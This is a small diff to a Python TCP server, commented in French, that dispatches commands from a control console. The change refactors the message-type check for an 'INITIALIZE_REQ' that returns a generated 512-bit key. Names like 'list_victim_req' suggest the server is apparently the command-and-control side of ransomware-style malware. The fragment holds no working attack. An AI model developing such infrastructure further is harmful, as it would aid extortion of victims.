@@ -62,6 +62,7 @@ class server_tcp(object):
         Système de gestion des commandes envoyées par la console de contrôle
         """
         conn = udata.connect_db()
+        msg_type = message.get_message_type(msg)
         if msg == message.list_victim_req():
             # On va interroger le serveur SQL depuis le serveur frontal pour des raisons
             # De sécurité...
@@ -76,7 +77,7 @@ class server_tcp(object):
         elif msg == 'CHANGE_STATE':
             # C'est à faire
             return "Todo3"
-        elif "INITIALIZE_REQ" in msg:
+        elif msg_type == "INITIALIZE_REQ":
             key_rq = security.gen_key(512)
             return key_rq
         elif msg == message.close_connexion():
